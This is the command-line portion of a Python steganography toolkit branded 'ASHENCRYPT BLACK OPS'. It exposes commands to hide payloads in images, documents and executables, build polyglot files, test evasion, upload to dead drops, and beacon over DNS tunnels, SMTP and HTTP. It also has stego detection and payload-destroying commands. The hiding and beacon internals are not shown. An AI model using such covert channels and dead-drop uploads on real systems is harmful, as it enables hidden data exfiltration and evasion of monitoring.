    _ban("HTTP Beacon")
    r = _http_beacon(Path(args.stego), args.url, args.secret)
    for k, v in r.items():
        print(f"  {k:<12}: {v}")
    return 0


def _c_sd(args) -> int:
    _ban("Self-Destruct Watch")
    r = _sd_watch(Path(args.stego), args.password or "x")
    for k, v in r.items():
        print(f"  {k:<20}: {v}")
    return 0


def _c_capacity(args) -> int:
    _ban("Capacity")
    p = Path(args.path)
    paths = [p] if p.is_file() else sorted(p.iterdir())
    for path in paths:
        if path.suffix.lower() not in (_IMG_EXT | _AUD_EXT | _VID_EXT |
                                       _DOC_EXT | _EXE_EXT | _ARC_EXT):
            continue
        print(f"\n  {_C['b']}{path.name}{_C['x']}")
        for name in _auto_algo_for(path):
            try:
                cap = _A[name].capacity_bytes(path)
                if cap > 0:
                    print(f"    {name:<10} {cap:>12,} B")
            except Exception:
                pass
    return 0


def _c_vault(args) -> int:
    _ban(f"Vault \u2014 {args.action}")
    v = _Vault(Path(args.path), args.master_pw or "")
    if args.action == "init":
        v.init()
        print(f"  initialized {args.path}")
    elif args.action == "add":
        kid = v.add(args.label, args.key_pw)
        print(f"  added '{args.label}' id={kid}")
    elif args.action == "list":
        for k in v.list_keys():
            print(f"  [{k['id']}] {k['label']}")
    elif args.action == "get":
        print(f"  {v.get(args.label) or 'not found'}")
    return 0


def _c_self_test(_a) -> int:
    return _self_test()


class _HelpParser(argparse.ArgumentParser):
    def error(self, message):
        self.print_help(sys.stderr)
        sys.stderr.write(f"\n{_NEON}error:{_C['x']} {message}\n")
        sys.exit(2)


def _parser():
    p = _HelpParser(
        prog="ashencrypt",
        description="ASHENCRYPT BLACK OPS by SYLHETYHACKVENGER (THE-ERROR808)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Run 'ashencrypt <command> -h' for details on any command.")
    sub = p.add_subparsers(dest="cmd")

    ah = sub.add_parser("auto", help="automatic hide/extract")
    ahs = ah.add_subparsers(dest="sub")

    h = ahs.add_parser("hide", help="hide payload in carriers")
    h.add_argument("payload")
    h.add_argument("covers")
    h.add_argument("--out", "-o", default="./ash_out")
    h.add_argument("-p", "--password")
    h.add_argument("-k", "--keyfile")
    h.add_argument("--key")
    h.add_argument("--vault-pw")
    h.add_argument("--rs", action="store_true")
    h.add_argument("--adversarial", action="store_true")
    h.add_argument("--decoy", action="store_true")
    h.add_argument("--honey", action="store_true")
    h.add_argument("--channel")
    h.add_argument("--nest", type=int, default=0)
    h.add_argument("--self-destruct", type=int)
    h.set_defaults(func=_c_auto_hide)

    x = ahs.add_parser("extract", help="extract hidden payload")
    x.add_argument("stego")
    x.add_argument("output")
    x.add_argument("-p", "--password")
    x.add_argument("-k", "--keyfile")
    x.add_argument("--key")
    x.add_argument("--vault-pw")
    x.add_argument("--channel")
    x.add_argument("--nest", type=int, default=0)
    x.set_defaults(func=_c_auto_extract)

    b = sub.add_parser("batch", help="batch embed all files in dir")
    b.add_argument("--input", required=True)
    b.add_argument("--covers", required=True)
    b.add_argument("--out", "-o", default="./ash_batch")
    b.add_argument("--report")
    b.add_argument("--workers", type=int, default=4)
    b.add_argument("-p", "--password")
    b.add_argument("--rs", action="store_true")
    b.add_argument("--adversarial", action="store_true")
    b.add_argument("--channel")
    b.set_defaults(func=_c_batch)

    hu = sub.add_parser("hunt", help="scan file for stego")
    hu.add_argument("target")
    hu.add_argument("--deep", action="store_true")
    hu.set_defaults(func=_c_hunt)

    ca = sub.add_parser("carve", help="extract embedded payload without keys")
    ca.add_argument("target")
    ca.add_argument("--out", "-o", default="./carved")
    ca.set_defaults(func=_c_carve)

    po = sub.add_parser("poison", help="destroy embedded payloads")
    po.add_argument("input")
    po.add_argument("output")
    po.add_argument("--mode", choices=["shuffle", "invert_lsb", "noise",
                                       "recompress", "blur"], default="shuffle")
    po.set_defaults(func=_c_poison)

    hn = sub.add_parser("honey", help="generate honey trap images")
    hn.add_argument("--count", type=int, default=10)
    hn.add_argument("--out", "-o", default="./honey")
    hn.set_defaults(func=_c_honey)

    ev = sub.add_parser("evade", help="test evasion against attacks")
    ev.add_argument("carrier")
    ev.add_argument("payload")
    ev.add_argument("-a", "--algorithm", choices=list(_A))
    ev.set_defaults(func=_c_evade)

    pl = sub.add_parser("polyglot", help="build polyglot file")
    pl.add_argument("carrier")
    pl.add_argument("payload")
    pl.add_argument("output")
    pl.add_argument("--prepend")
    pl.set_defaults(func=_c_polyglot)

    ch = sub.add_parser("chain", help="layered encode/decode")
    ch.add_argument("mode", choices=["encode", "decode"])
    ch.add_argument("input")
    ch.add_argument("output")
    ch.add_argument("--layers", type=int, default=3)
    ch.set_defaults(func=_c_chain)

    dd = sub.add_parser("dead-drop", help="upload encrypted payload")
    dd.add_argument("payload")
    dd.add_argument("url")
    dd.add_argument("-k", "--key", required=True)
    dd.set_defaults(func=_c_dead_drop)

    dn = sub.add_parser("dns-beacon", help="DNS tunnel beacon")
    dn.add_argument("domain")
    dn.add_argument("secret")
    dn.set_defaults(func=_c_dns_beacon)

    sm = sub.add_parser("smtp-beacon", help="SMTP beacon")
    sm.add_argument("host")
    sm.add_argument("--port", type=int, default=587)
    sm.add_argument("--user", required=True)
    sm.add_argument("--pw", required=True)
    sm.add_argument("--to", required=True)
    sm.add_argument("--subject", default="beacon")
    sm.add_argument("--body", default="ok")
    sm.set_defaults(func=_c_smtp_beacon)

    hb = sub.add_parser("http-beacon", help="HTTP webhook beacon")
    hb.add_argument("stego")
    hb.add_argument("url")
    hb.add_argument("secret")
    hb.set_defaults(func=_c_http_beacon)

    sd = sub.add_parser("self-destruct", help="check expiry on stego")
    sd.add_argument("stego")
    sd.add_argument("-p", "--password")
    sd.set_defaults(func=_c_sd)

    c = sub.add_parser("capacity", help="report capacity of file/dir")
    c.add_argument("path")
    c.set_defaults(func=_c_capacity)

    v = sub.add_parser("vault", help="manage encrypted key vault")
    v.add_argument("action", choices=["init", "add", "list", "get"])
    v.add_argument("--path", default="ash_vault.kf")
    v.add_argument("--master-pw")
    v.add_argument("--label")
    v.add_argument("--key-pw")
    v.set_defaults(func=_c_vault)

    st = sub.add_parser("self-test", help="run internal tests")
    st.set_defaults(func=_c_self_test)

    return p


def _entry() -> int:
    argv = sys.argv[1:]
    wants_help = any(a in ("-h", "--help") for a in argv)
    parser = _parser()
    if not argv:
        _show_banner()
        parser.print_help()
        return 0
    if wants_help:
        return parser.parse_args(argv).func(parser.parse_args(argv)) if False else _help_entry(argv)
    _show_banner()
    args = parser.parse_args(argv)
    if not getattr(args, "func", None):
        parser.print_help()
        return 0
    return args.func(args)


def _help_entry(argv) -> int:
    parser = _parser()
    parser.parse_args(argv)
    return 0


if __name__ == "__main__":
    sys.exit(_entry())
